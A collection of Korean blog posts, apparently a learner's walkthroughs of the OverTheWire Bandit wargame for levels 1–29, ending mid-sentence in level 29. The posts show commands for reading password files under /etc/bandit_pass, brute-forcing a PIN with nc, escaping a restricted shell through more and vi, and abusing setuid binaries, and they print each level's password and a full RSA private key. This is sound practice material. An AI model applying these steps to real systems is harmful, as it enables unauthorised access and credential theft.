{"pages":[],"posts":[{"title":"bandit 워게임 level1 풀이","text":"Level Goal The password for the next level is stored in a file called - located in the home directory 다음 레벨의 비밀번호는 홈 디렉토리에 있는 - 라는 파일에 저장되어있다. 파일안에 있는 내용을 보기 위해 cat명령어를 사용하여 내용을 출력한다. cat ./- level2의 패스워드를 찾았다! CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9","link":"/2022/02/14/Bandit/bandit1/"},{"title":"bandit 워게임 level10 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, which contains base64 encoded data 다음 레벨의 비밀번호는 base64로 인코딩된 데이터가 포함된 data.txt 파일에 저장되어있다. data.txt의 내용이 base64로 인코딩되어 있다. 이를 base64명령어로 다시 디코딩 하면 될것 같다. base64 -d data.txt 옵션 설명 없음 base64로 인코딩 -d base64로 된 데이터 디코딩 -i 디코딩 할 때, 알파벳이 아닌 문자 무시 level11의 패스워드를 찾았다! IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR","link":"/2022/02/14/Bandit/bandit10/"},{"title":"bandit 워게임 level11 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions 다음 레벨의 비밀번호는 data.txt 파일에 저장됩니다. 여기서 모든 소문자(a-z) 및 대문자(A-Z)가 13자리 회전되어있다. data.txt의 내용이 13자리씩 밀려 있다.A는 N이 되고 B는 O, C는 P… 13자리씩 밀려 있으니 다시 13번 밀면 다시 원점으로 돌아온다.(알파벳은 25자리) tr명령어를 사용한다. cat data.txt | tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’ level12의 패스워드를 찾았다! 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu","link":"/2022/02/14/Bandit/bandit11/"},{"title":"bandit 워게임 level12 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!) 다음 레벨의 비밀번호는 반복적으로 압축된 파일의 16진 덤프인 data.txt 파일에 저장됩니다. 이 수준의 경우 아래에 디렉터리를 만드는 것이 유용할 수 있다. /tmp에서 mkdir을 사용하여 작업할 수 있습니다. 예: mkdir /tmp/myname123. 그런 다음 cp를 사용하여 데이터 파일을 복사하고 mv를 사용하여 이름을 바꿉니다(맨페이지 읽기!) 노가다 주의!!!!data.txt의 내용이 16진수로 덤프되어있다.일단 /tmp에 아무 디렉토리를 만들고 data.txt를 복사해온다. xxd명령어를 사용하여 16진수 데이터를 바이너리 데이터로 변환한다. xxd -r data.txt data file을 이용해 속성값을 확인하다. 데이터는 gzip으로 압축되었다고한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 bzip2으로 압축되었다고 한다.data의 확장자를 bz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 gzip으로 압축되었다고 한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. data5.bin의 속성을 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. 속성값을 다시 확인하니 bzip2으로 압축되었다고 한다.data의 확장자를 bz로 바꾸고 압축을 푼다. data6의 속성을 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. 속성값을 다시 확인하니 gzip으로 압축되었다고 한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 드디어 길고길었던 노가다가 끝났다.level13의 패스워드를 찾았다! 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL","link":"/2022/01/09/Bandit/bandit12/"},{"title":"bandit 워게임 level13 풀이","text":"Level Goal The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on 다음 레벨의 비밀번호는 /etc/bandit_pass/bandit14에 저장되며 bandit14 사용자만 읽을 수 있습니다. 이 수준의 경우 다음 암호를 얻지 못하지만 다음 수준에 로그인하는 데 사용할 수 있는 개인 SSH 키를 얻습니다. 참고: localhost는 작업 중인 시스템을 나타내는 호스트 이름이다. 파일 이름을 보니 ssh 비밀키 인것 같다. 비밀키가 별도의 저장소에 저장되어 있다.그럴 때에는 -i 옵션을 사용하여 경로를 지정하면 된다. ssh -i sshkey.private bandit14@localhost bandit14계정에 접속하였다. level14의 패스워드를 찾았다! 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e","link":"/2022/01/09/Bandit/bandit13/"},{"title":"bandit 워게임 level14 풀이","text":"Level Goal The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost. 다음 수준의 암호는 현재 수준의 암호를 localhost의 포트 30000에 제출하여 검색할 수 있다. ssh로 30000포트에 접속시도 했을땐 접속이 거부당한다. ssh -p 30000 localhost 아마 telnet으로 접속해야 될것 같다. telnet localhost 30000 비번은 14레벨 암호를 치면 된다. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e level15의 패스워드를 찾았다! BfMYroe26WYalil77FoDi9qh59eK5xNr","link":"/2022/01/09/Bandit/bandit14/"},{"title":"bandit 워게임 level15 풀이","text":"Level Goal The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command… 다음 레벨의 비밀번호는 SSL 암호화를 사용하여 localhost의 포트 30001에 현재 레벨의 비밀번호를 제출하여 검색할 수 있습니다. 도움이 되는 메모: “HEARTBEATING” 및 “Read R BLOCK”이 필요하십니까? -ign_eof를 사용하고 맨페이지의 “CONNECTED COMMANDS” 섹션을 읽으십시오. ‘R’ 및 ‘Q’ 옆에 ‘B’ 명령은 해당 명령의 이 버전에서도 작동합니다… s_client는 SSL/TLS를 사용하는 원격 호스트에 접속하기 위한 SSL/TLS client를 구현하는 명령어이다. openssl s_client -connect localhost:30001 telnet localhost 30000 비번은 15레벨 암호를 치면 된다. BfMYroe26WYalil77FoDi9qh59eK5xNr level16의 패스워드를 찾았다! cluFn7wTiGryunymYOu4RcffSxQluehd","link":"/2022/01/09/Bandit/bandit15/"},{"title":"bandit 워게임 level16 풀이","text":"Level Goal The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. 다음 레벨의 자격 증명은 현재 레벨의 비밀번호를 31000 ~ 32000 범위의 localhost 포트에 제출하여 검색할 수 있습니다. 먼저 이러한 포트 중 서버가 수신 대기하는 포트를 찾으십시오. 그런 다음 SSL을 사용하는 것과 그렇지 않은 것을 찾으십시오. 다음 자격 증명을 제공할 서버는 1개뿐이며 나머지 서버는 귀하가 보내는 모든 것을 다시 귀하에게 보냅니다. nmap을 통해 31000~32000범위의 포트 중 열려 있는 포트를 찾는다 nmap -p 31000-32000 localhost 4개의 포트가 나왔다.일단 전부다 ssl 연결을 하여 ssl을 사용하고 있는지 확인한다. openssl s_client -connect localhost:[포트번호] 31790 포트만이 레벨 16의 패스워드를 입력했을때 비밀키를 반환한다. cluFn7wTiGryunymYOu4RcffSxQluehd 비밀키를 복사해서 /tmp 디렉토리에 파일을 만들고 복사한다. (예전에 tmp에 파일이나 디렉토리를 만들수 있다는 힌트가 있었음) —–BEGIN RSA PRIVATE KEY—–MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=—–END RSA PRIVATE KEY—– 레벨 13에서 했던것 처럼 경로를 잡아주고 ssh접속을 한다. 권한떄문에 접속이 거부 됬다. 파일의 권한을 700으로 바꿔서 시도한다. chmod 700 /tmp/private_key1231231123 다시 접속해 본다. 홈 디렉토리엔 파일이 2개 있지만 이것 level18를 가기 위한 파일인 것 같다. 각 패스워드 비번이 있는 /etc/bandit_pass에 들어가 패스워드 파일을 출력해 본다. level17의 패스워드를 찾았다! xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn","link":"/2022/01/09/Bandit/bandit16/"},{"title":"bandit 워게임 level17 풀이","text":"Level Goal There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.newNOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19 홈디렉토리에는 2개의 파일이 있습니다: passwords.old 및 passwords.new. 다음 레벨의 비밀번호는 passwords.new에 있으며 이것은 passwords.old와 passwords.new 사이에서 변경된 유일한 줄입니다. 참고: 이 레벨을 해결하고 bandit18에 로그인하려고 할 때 ‘Byebye!’가 표시되면 이 다음 레벨 bandit19와 관련이 있습니다. 홈디렉토리에 파일이 두개 있다. 힌트를 보니 두개의 파일을 비교하여 서로 다른 점을 찾으면 될것 같다.diff 명령어를 사용하여 차이점을 찾는다. diff -c passwords.new passwords.old 왼쪽에 **!**표시가 뜬 줄이 차이점이다. 그중 제일 위쪽에 있는 “!”가 있는 줄은 passwords.new안에 있는 내용이고 이것이 패스워드 인것 같다. level18의 패스워드를 찾았다! kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd","link":"/2022/01/09/Bandit/bandit17/"},{"title":"bandit 워게임 level18 풀이","text":"Level Goal The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH. 다음 레벨의 비밀번호는 홈디렉토리의 readme 파일에 저장됩니다. 불행히도 누군가 SSH로 로그인할 때 로그아웃하도록 .bashrc를 수정했습니다. .bashrc는 별칭(alias)과 bash가 수행될 때 실행되는 함수를 제어하는 지역적인(사용자 전용) 시스템 설정과 관련된 셸 스크립트이다. bash셸을 시작할 때마다 즉 터미널 창을 열 떄마다 .bashrc가 자동으로 실행된다. 그래서 bandit18에 로그인하면 연결이 자동으로 종료된다. ssh의 옵션중 -t를 사용하면 된다. ssh -t : 가짜(pseudo) 터미널 강제 할당 ssh bandit18@localhost -t /bin/sh 그냥 -t를 쓰면 bash셸이 실행되니 sh이 실행 될수 있도록 /bin/sh를 쓴다. 로그인을 하여도 연결이 종료되지 않는다. cat readme level19의 패스워드를 찾았다! IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x 추가!/bin/sh를 종료하자마자 .bashrc이 실행됨","link":"/2022/01/09/Bandit/bandit18/"},{"title":"bandit 워게임 level19 풀이","text":"Level Goal To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary. 다음 레벨에 액세스하려면 홈 디렉토리에서 setuid 바이너리를 사용해야 합니다. 인수 없이 실행하여 사용법을 알아보세요. 이 레벨의 비밀번호는 setuid 바이너리를 사용한 후 일반적인 위치(/etc/bandit_pass)에서 찾을 수 있습니다. 홈디렉토리에 bandit20-do파일이 있는데 이에 setuid가 설정 되어 있다. setuid가 설정되어 있으면 파일을 실행한 순간만 그 파일을 소유하고 있는 사용자의 권한으로 실행됩니다. (잠시 권한을 빌려오는 것과 같다.) setuid가 있는 프로그램은 권한 상승을 할수 있는 취약점이 있을 수 있기 때문에 보안상 취약하다. setuid가 설정되어 있으면 소유자 권한의 실행권한(x, X)가 s, S로 되어있다. bandit20-do를 실행보니 setuid 바이너리 사용방법이 나왔다. ./bandit20-do 예시를 보니 ./bandit20-do을 실행해 bandit20권한으로 id를 실행하는 것 같다. id자리에 /etc/bandit_pass/bandit20을 실행하면 될 것 같다. level20의 패스워드를 찾았다! GbKksEFF4yrVs6il55v6gwY5aVje5f0j","link":"/2022/01/09/Bandit/bandit19/"},{"title":"bandit 워게임 level2 풀이","text":"Level Goal The password for the next level is stored in a file called spaces in this filename located in the home directory 다음 레벨의 비밀번호는 홈 디렉토리에 있는 spaces in this filename이라는 파일에 저장되어있다. 파일 이름에 공백(스페이스)가 있거나 넣고 싶은 경우는 **\\(역슬래시)**를 사용한다. cat ./spaces\\ in\\ this\\ filename (tab키를 치면 쉽다) level3의 패스워드를 찾았다! UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK","link":"/2022/01/09/Bandit/bandit2/"},{"title":"bandit 워게임 level20 풀이","text":"Level Goal There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Try connecting to your own network daemon to see if it works as you think 홈 디렉토리에 다음을 수행하는 setuid 바이너리가 있습니다. 명령줄 인수로 지정한 포트에서 localhost에 연결합니다. 그런 다음 연결에서 텍스트 줄을 읽고 이전 수준(bandit20)의 암호와 비교합니다. 암호가 정확하면 다음 레벨(bandit21)의 암호를 전송합니다. 참고: 자신의 네트워크 데몬에 연결하여 생각한 대로 작동하는지 확인하십시오. 홈디렉토리에 suconnect라는 파일이 있다. 이를 실행 보면 다음과 같은 문구가 나온다. This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. 이 프로그램은 TCP를 사용하여 localhost의 지정된 포트에 연결합니다. 상대방으로부터 올바른 비밀번호를 받으면 다음 비밀번호를 다시 전송합니다. 처음엔 포트를 찾는 문제인줄 알고 삽질하다가 포트를 임의로 지정하여 열어주면 된다는 것을 알게되었다.(결론: 답지 봤다..) tmux명령어를 사용하면 창분할을 할 수 있다. 창 분할(ctrl + b)누르고 % : 좌우로 나누기(ctrl + b)누르고 “ : 위아래로 나누기 창 이동(ctrl + b)누르고 방향키 : 지정한 방향의 창으로 이동 nc -l -p 3333[아무포트번호]포트를 열어준뒤 level20의 패스워드를 입력한 후 옆창으로 이동해 **./suconnect [포트번호]**를 치면 입력받은 패스워드를 비교해서 맞으면 level21의 패스워드를 반환받는다. level21의 패스워드를 찾았다! gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr","link":"/2022/01/09/Bandit/bandit20/"},{"title":"bandit 워게임 level21 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. **/etc/cron.d/**에 무엇이 있는지 확인하다. 여러가지 파일이 있지만 bandit22의 패스워드가 궁금하기에cronjob_bandit22파일을 출력해 본다. 출력한 내용을 보니/usr/bin/cronjob_bandit22.sh를 부팅시, 1분마다 실행하고 출력 결과를 폐기해라(/dev/null에 넣어라)라고 되어있다. /usr/bin/cronjob_bandit22.sh가 수상해 보이니 출력해본다. 출력 내용을 보니/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv의 사용권한을 644로 바꾸고 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv에 /etc/bandit_pass/bandit22파일 출력 내용을 저장하도록 되어 있다. /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv을 출력해본다 level22의 패스워드를 찾았다! Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI","link":"/2022/01/09/Bandit/bandit21/"},{"title":"bandit 워게임 level22 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints. 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. 참고: 다른 사람이 작성한 쉘 스크립트를 보는 것은 매우 유용한 기술입니다. 이 레벨의 스크립트는 의도적으로 읽기 쉽게 만들어졌습니다. 그것이 하는 일을 이해하는 데 문제가 있다면, 그것을 실행하여 출력하는 디버그 정보를 보십시오. **/etc/cron.d/**에 무슨파일이 있는지 확인하고 출력해본다. 내용을보니 level21과 비슷하게 /usr/bin/cronjob_bandit23.sh를 부팅시, 1분마다 실행하고 출력 결과를 폐기해라(/dev/null에 넣어라)라고 되어있다. /usr/bin/cronjob_bandit23.sh를 출력해본다. myname이라는 변수에 whoami의 값을 넣었다. mytarget은 **”I am user (myname값)”**을 md5 해쉬값으로 나타내고 ‘ ‘(공백)을 기준으로 나눈뒤 첫번째 필드를 잘라 출력하는 것이다. 그뒤 **/etc/bandit_pass/(myname값)**의 내용을 /tmp/(mytarget값)에 복사해 출력한다. /usr/bin/cronjob_bandit23.sh를 실행하고 나온 값을 통해 /tmp폴더에 있는 파일을 출력 해본다. level22의 패스워드가 나왔다. whoami는 현재 사용자 즉 bandit22를 가르키기 때문이다. bandit23일때의 mytarget의 값을 안다면 패스워드를 찾을수 있을 것이다. 아까 쉘스크립에서 해쉬값을 자동으로 계산하는 부분에서 whoami받아오는 부분을 수동으로 입력해서 나온 값을 통해 /tmp폴더에 있는 파일을 출력 해본다. level23의 패스워드를 찾았다! jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n","link":"/2022/01/09/Bandit/bandit22/"},{"title":"bandit 워게임 level23 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around… 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. 참고: 이 수준에서는 첫 번째 셸 스크립트를 만들어야 합니다. 이것은 매우 큰 단계이며 이 레벨을 달성했을 때 스스로를 자랑스러워해야 합니다! 참고 2: 쉘 스크립트는 일단 실행되면 제거되므로 사본을 보관하고 싶을 수도 있습니다. **/etc/cron.d/**에 무슨파일이 있는지 확인하고 출력해본다. /usr/bin/cronjob_bandit24.sh를 출력해본다. echo를 보니 /var/spool/[myname] 안에 있는 모든 스크립트를 실행하고 지운다고 되어 있다. #!/bin/bash myname=$(whoami) //bandit24 (bandit24에서 실행되고 있다.) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; // 모든 파일 반복 do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; //파일이 .(현재 디렉토리), ..(상위 디렉토리)가 아니라면 실행 then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" //owner라는 변수에 %U - 현재 파일 소유자의 사용자 이름을 넣음 if [ \"${owner}\" = \"bandit23\" ]; then //만약 owner의 값이 bandit23이라면 timeout -s 9 60 ./$i //파일을 실행하고 60초후 프로세스를 종료한다. fi rm -f ./$i //파일을 강제 삭제 fi done /var/spool로 이동해 권한을 확인해 본다. 다른 사용자는 쓰고, 실행할 수 있는 권한이 있다.여기에 쉘스크립트를 작성해서 복사하면 된다. /tmp에 아무 디렉토리를 생성하고 쉘스크립트를 작성한다. /tmp/dir24/pass.sh #!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/dir24/bandit24pass 생성한 디렉토리와 하위 파일이나 폴더에 777권한을 준다.(왜냐하면 권한이 없으면 파일이 저장되지 않기 때문이다.) chmod -R 777 /tmp/dir24 권한을 부여한 뒤 /var/spool/bandit24에 쉘스크립트를 복사한다.복사한후 1분이 지나고 패스워드가 저장된 파일을 연다. level24의 패스워드를 찾았다! UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ","link":"/2022/01/09/Bandit/bandit23/"},{"title":"bandit 워게임 level24 풀이","text":"Level Goal A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. 데몬은 포트 30002에서 수신 대기 중이며 bandit24에 대한 비밀번호와 비밀 숫자 4자리 핀코드가 제공된 경우 bandit25에 대한 비밀번호를 제공합니다. 무차별 대입(brute-forcing)이라고 하는 10000가지 조합을 모두 통과하는 것 외에는 암호를 검색할 방법이 없습니다. 30002포트로 nc로 연결한다.(Netcat[nc]는 네트워크 연결에서 데이터를 읽고 쓸수 있다.) bandit24의 비밀번호는 알지만 4자리 핀코드를 알수 없기에 하나씩 때려 맞춰야 한다. 그러기엔 경우의수가 1만가지나 있기에 시간이 매우 오래 걸린다. 쉘스크립트를 작성해 빠르게 패스워드를 대입할수 있도록 패스워드 파일을 만든다. /tmp에 디렉토리를 만들고 쉘스크립트 파일을 생성한다. /tmp/bn24/bruteforce.sh #!/bin/bash passwd=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ (bandit24의 패스워드) for i in {0000..9999} (0000, 0001, 0002 ... 9999) do echo $passwd $i >> /tmp/bn24/passlist (패스워드 경우의 수를 파일에 저장) done 파일에 권한을 주고 실행한다. 실행을 하고 나면 파일에 패스워드의 0000부터 9999까지의 모든 경우의 수가 저장되어 있다. 연결할때 경우의 수를 대입하면 된다. cat /tmp/bn24/passlist | nc localhost 30002 level25의 패스워드를 찾았다! uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG","link":"/2022/01/09/Bandit/bandit24/"},{"title":"bandit 워게임 level25 풀이","text":"Level Goal Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. bandit25에서 bandit26으로 로그인하는 것은 상당히 쉬울 것입니다… bandit26 사용자를 위한 쉘은 /bin/bash가 아니라 다른 것입니다. 그것이 무엇인지, 어떻게 작동하며 어떻게 빠져나갈 수 있는지 알아보십시오. 홈디렉토리에 ssh키가 있다. ssh 접속을 시도해 본다. bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost enjoy your stay ! bandit26를 출력하고 접속을 끝낸다.bandit26의 쉘이 /bin/bash가 아니라 다른 쉘이 실행되서 그런것 같다. bandit26이 사용하는 쉘을 찾는다. 쉘의 내용을 출력해본다. #!/bin/sh export TERM=linux // 터미널 에뮬레이터를 linux로 설정 more ~/text.txt // more로 홈디렉토리에 있는 text.txt 열기 exit 0 // 쉘스크립트를 성공적으로 종료 (범위 : 0~255 [1~255는 오류 코드라고 인식된다.]) 여기선 부터 답쥐를 봤다…(리눅스 초보에겐 너무 어렵다..) putty로 실행한다는 가정하에 putty창을 줄이고 ssh접속을 시도하면exit 0코드가 실행되기 전에 more가 실행된다고한다. more의 옵션에는 v가 있는데 이는 현재 열려있는 파일의 현재 위치에서 vi 편집기를 실행한다고 한다. v를 누르고 vi 확정명령모드(Last Line Mode)에서 다음과 같은 명령어를 입력한다 :e /etc/bandit_pass/bandit26 // /etc/bandit_pass/bandit26을 불러오기 level26의 패스워드를 찾았다! 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z","link":"/2022/01/09/Bandit/bandit25/"},{"title":"bandit 워게임 level26 풀이","text":"Level Goal Good job getting a shell! Now hurry and grab the password for bandit27! 쉘을 잘 얻었습니다! 이제 서둘러 bandit27의 비밀번호를 잡으세요! bandit25를 푸는 방법은 2가지가 있다 more에서 vi를 실행시켜 파일을 읽어 오는 법과 bandit26의 쉘을 /bin/bash로 바꾸어 실행하는 것이 있다. 쉘을 바꾸기 위해서는전단계에서 했던 것 처럼 more에서 vi를 키고 다음과 같은 명령어를 쳐 쉘을 변경한다. :set shell=/bin/bash 변경된 쉘내용을 실행한다. :sh 이제 접속이 끊기지 않고 bandit26계정을 사용할 수 있다! 일단 무슨 파일이 있는지 확인한다. bandit27에 setuid가 설정되어 있다.일단 내용을 확인해본다. 알수 없는 문자들이 많지만 마지막에 힌트가 있는거 같아 Run a command as another user. 다른 사용자로 명령어를 실행한다.Example: %s id 예전에 레벨에 했던 것과 똑같은 풀이법인 것 같다. ./bandit27-do cat /etc/bandit_pass/bandit27 level27의 패스워드를 찾았다! 3ba3118a22e93127a4ed485be72ef5ea","link":"/2022/01/09/Bandit/bandit26/"},{"title":"bandit 워게임 level27 풀이","text":"Level Goal There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. ssh://bandit28-git@localhost/home/bandit28-git/repo에 git 저장소가 있습니다. bandit27-git 사용자의 비밀번호는 bandit27 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. git 저장소를 복제해오기만 하면 되는 매우매우 간단한 문제다! /tmp에 저장소를 복제해 저장할 디렉토리를 만들어 주고 해당 디렉토리로 이동한다. 다음과 같은 명령어를 입력해 저장소를 복사해온다. 패스워드는 bandit27의 패스워드와 동일하다. git clone ssh://bandit27-git@localhost/home/bandit27-git/repo 저장소의 내용을 확인해보고 패스워드가 있을만한 파일을 읽어본다. level28의 패스워드를 찾았다! 0ef186ac70e04ea33b4c1853d2526fa2","link":"/2022/01/09/Bandit/bandit27/"},{"title":"bandit 워게임 level28 풀이","text":"Level Goal There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. ssh://bandit28-git@localhost/home/bandit28-git/repo에 git 저장소가 있습니다. bandit28-git 사용자의 비밀번호는 bandit28 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. 디렉토리를 만들어 주고 해당 디렉토리에 저장소를 복사한다. git clone ssh://bandit28-git@localhost/home/bandit28-git/repo 일단 무슨 파일이 있는지 확인하고 읽어본다. 패스워드의 정보는 알려주지 않았다…….. (OTL) 힘들게 ./git에 있는 폴더를 하나씩 출력하고 삽질한 끝에 떠올린 히스토리 조회? 리비전 조회! git log를 사용하면 어떤 커밋이 있었는지 조회가 가능하다! 총 3개의 커밋한 흔적이 있다. 차례대로 설명을 읽어보니 다음과 같다. 정보 누출 수정 누락된 데이터 추가 README.md의 초기 커밋 첫번째있는 것이 bandit29의 패스워드가 있을 확률이 높다.커밋한 내용을 확인해본다. git show edd935d60906b33f0619605abd1689808ccdd5ee(커밋 sha 해시값) level29의 패스워드를 찾았다! bbc96594b4e001778eee9975372716b2","link":"/2022/01/09/Bandit/bandit28/"},{"title":"bandit 워게임 level29 풀이","text":"Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29. Clone the repository and find the password for the next level. ssh://bandit29-git@localhost/home/bandit29-git/repo에 git 저장소가 있습니다. bandit29-git 사용자의 비밀번호는 bandit29 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. 디렉토리까진 2번씩이나 했으니 생략한다. README.md를 읽어보니 패스워드정보 자체가 없다고 한다. 혹시 모르니 git로그를 확인해본다. 내용을 